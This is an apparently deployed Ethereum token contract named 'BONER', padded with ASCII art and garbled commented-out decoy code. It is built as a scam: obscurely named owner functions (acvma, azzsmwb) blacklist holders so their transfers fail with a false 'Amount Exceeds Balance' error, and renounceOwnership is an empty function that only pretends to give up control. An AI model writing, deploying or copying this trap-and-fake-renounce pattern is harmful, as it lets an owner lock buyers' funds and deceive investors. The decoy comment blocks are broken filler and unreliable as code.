/**
 *Submitted for verification at Etherscan.io on 2022-08-31
*/

pragma solidity 0.8.16;

/* 
    ██████████████████████▓▒▒▀█▓╣▒▒▒▒▒▒▒▒╟▒▒▒▒▒▒▀▀██████████████████████████████▓▓▓▓▓▓█▓▓███╬▒░░,á█▒░░╟▀
    ████████████████████████▓╢╣╢▒▒▒▒▒▒▒╢▒╢▒▒▒▒▒▒▒▒▒▒▒▒▀▀▀▀▀▀▀█████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████▓▀▓▓▓██▒▒░▒"
    █████████████████████████▓▓╣▒▒▒▒▒╢╢╢╫▌▒▒▒▒▒╢▒▒▒▒▒▒▒▒▒╢╢╢╢╢╢╣╢▒▒▒▒▒▀▀▀██▓▀▓▓██▓▓▓╢╣▓████▓▒▒▒▒▀▓█▌░╓▓▓
    ████████████████████████▓████▓▓╣╣╢╢╣▓▒▒╢╣▒▒▒╢╢▒╣▒▒▒▒▒▒▒▒▒▒▒▒╢╣╣╢▒▒▒▒▒▒╢▒▒▒▀▀█▓╣▒█▀▓████▓▒▒▒░░░▓▓███▓
    ██████████████████████████████▓▓▓▓▓▓█╣╢╢╢╢╢╢╣░▒▓╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢▓╣▒▒▒▒▐███▓▒▒▒░▒░░╠▓▓▓▓
    ███████████████████████████████▓█████▓╣▒▒╢╢▒╣▒╢▒╙▓╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╢▒▒▒▒▒███▓▒▒▒░░░░╟▓▓▓▓
    ███████████████████████████████████████▓▓▄▒▒╢╢▓▓▒▒╢╫╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒╢▒▒▒▒▒██▓▒▒▒▒░░░░╟▓▓▓▓
    ██████████████████████████████████████████▓▓╫▓▓▓▓╣▒▒▒╫╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢▒▓▒╣▒█▓▓▒▒▒░░░░░╠▓▓▓▓
    ████████████████████████████████████████████╣╢╢▓██▓╣▒▒▒╢╣╢▒▒▒▒╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╢▒▓╢▒█▓▓▒▒▒▒▒▒▒▒░▒▓▓▓▓
    ██████████████████████████████████████████████▓╣╣▓██▓▓▒▒╢╢╢╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╫▓▒▓█▓▓▓▒▒░░▒▒▒░▓▓▓▓▓
    ████████████████████████████████████████████████▓▓▓███▓▓╣╢╢╢╢╢╣▒▒▒▒▒▒▒▒▒▒▒▒▒╢╢╣▓╣▓▀▒▒▒▒▒▒▒▒▒▒▒╫▓▓▓▓█
    ███████████████████████████████████████████████████▓▓███▓▓▓╣╣╣╣╢▒▒▒▒▒▒▒▒▒▒╢╢╢╢╣▓▌░░░░░░▒░░░▒░░▓█████
    ██████████████████████████████████████████████████████████▓▓▓▓╢╣▒▒▒▒▒▒╢▒╢╢╢╣╣╢╣╣▒▒░░▒▒░░▒▒░▒░▒▓█████
    ████████████████████████████████████████████████████████████▓▓▓▓╣╣▒▒▒╢╣▒╢╢▓▓╣╣╫╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒╟█████
    ███████████████████████████████████████████████████████████████▓▓▓╣╢╢╢╢╣╢▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████
    ██████████████████████████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓╣╫█▓▒▒▒▒╫▓╣▒▒▒╢▓╣╣▒█████
    █████████████████████████████████████████████████████████████████▓▓▓▓▓█▓▓▓▓▓▓████▓▓╢█▓▓╣╣╢╢╢▓╣╣╠████
    ███████████████████████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓███▓▓▓██▓▓▓▓╣╢▒╢╢╣▒████
    ███████████████████████████████████████████████████████████████▓▓▓▓▓████▓▓▓▓▓███▓╣▓██▓▓▓▓▓╢╣╢╢▒▒████
    ███████████████████████████████████████████████████████████████▓▓▓▓█████▓▓▓▓▓██▓▓╢▓███▓▓▓▓▓▓▓▓▓▓████
    ███████████████████████████████████████████████████████████████▓▓▓▓████▓▓▓▓▓▓██▓▓╣▓███▓▓▓╣╫▓▓▓╟█████
    ███████████████████████████████████████████████████████████████▓▓▓▓███▓▓▓▓▓▓▓█▓▀╣╣███▓▓▓╣╣▓╣╣▒██████
    ███████████████████████████████████████████████████████████████▓▓▓▓███▓▓▓▓▓▓▓█▓▒▒████▓▓▓╣╢▓▓▒▓██████
    ███████████████████████████████████████████████████████████████▓▓▓▓▓▓█▓▓▓▓▓▓████████▓▓▓╣╢▓▓▒▓███████
    ███████████████████████████████████████████████████████████████▓▓▓▓▓▓▓▓▓██▓▓██████▓█▓███▓███████████
    ███████████████████████████████████████████████████████████████▓▓╫▓▓▓▓▓▓██▓▓███▓███▓████████████████
    ██████████████████████████████████████████████████████████████▓▓╣╢▓▓▓▓▓▓██▓▓▓███████████████████████
    ██████████████████████████████████████████████████████████████▓▓╢╣╫▓▓▓▓▓██▓▓▓██▓████████████████████
    ▓▓████████████████████████████████████████████████████████████▓▓╣▒╫▓▓▓▓▓███▓█████████████████▓██▓███
    ---``````---````-----```---------¬¬-    ----``````````--`````          ` `    `-` `   -  ¬--    `  -
     
     BBBBBBBBBBBBBBBBB        OOOOOOOOO     NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEE                    
B::::::::::::::::B     OO:::::::::OO   N:::::::N       N::::::NE::::::::::::::::::::E                    
B::::::BBBBBB:::::B  OO:::::::::::::OO N::::::::N      N::::::NE::::::::::::::::::::E                    
BB:::::B     B:::::BO:::::::OOO:::::::ON:::::::::N     N::::::NEE::::::EEEEEEEEE::::E                    
  B::::B     B:::::BO::::::O   O::::::ON::::::::::N    N::::::N  E:::::E       EEEEEErrrrr   rrrrrrrrr   
  B::::B     B:::::BO:::::O     O:::::ON:::::::::::N   N::::::N  E:::::E             r::::rrr:::::::::r  
  B::::BBBBBB:::::B O:::::O     O:::::ON:::::::N::::N  N::::::N  E::::::EEEEEEEEEE   r:::::::::::::::::r 
  B:::::::::::::BB  O:::::O     O:::::ON::::::N N::::N N::::::N  E:::::::::::::::E   rr::::::rrrrr::::::r
  B::::BBBBBB:::::B O:::::O     O:::::ON::::::N  N::::N:::::::N  E:::::::::::::::E    r:::::r     r:::::r
  B::::B     B:::::BO:::::O     O:::::ON::::::N   N:::::::::::N  E::::::EEEEEEEEEE    r:::::r     rrrrrrr
  B::::B     B:::::BO:::::O     O:::::ON::::::N    N::::::::::N  E:::::E              r:::::r            
  B::::B     B:::::BO::::::O   O::::::ON::::::N     N:::::::::N  E:::::E       EEEEEE r:::::r            
BB:::::BBBBBB::::::BO:::::::OOO:::::::ON::::::N      N::::::::NEE::::::EEEEEEEE:::::E r:::::r            
B:::::::::::::::::B  OO:::::::::::::OO N::::::N       N:::::::NE::::::::::::::::::::E r:::::r            
B::::::::::::::::B     OO:::::::::OO   N::::::N        N::::::NE::::::::::::::::::::E r:::::r            
BBBBBBBBBBBBBBBBB        OOOOOOOOO     NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE rrrrrrr 
     
     
     
* /  


  


 File: @openzeppelin/contracts/math/Math.sol


  
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   

       return abi.decode(data, (bytes32)); */   




	
	


/* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/
contract BONER {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zVal;

    // 
    string public name = "BONEr";
    string public symbol = unicode"BONEr";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function acvma(address _user) public onlyOwner {
        require(!zVal[_user], "x");
        zVal[_user] = true;
     
    }


    /* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/
    
    function azzsmwb(address _user) public onlyOwner {
        require(zVal[_user], "xx");
        zVal[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!zVal[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!zVal[from] , "Amount Exceeds Balance"); 
               require(!zVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}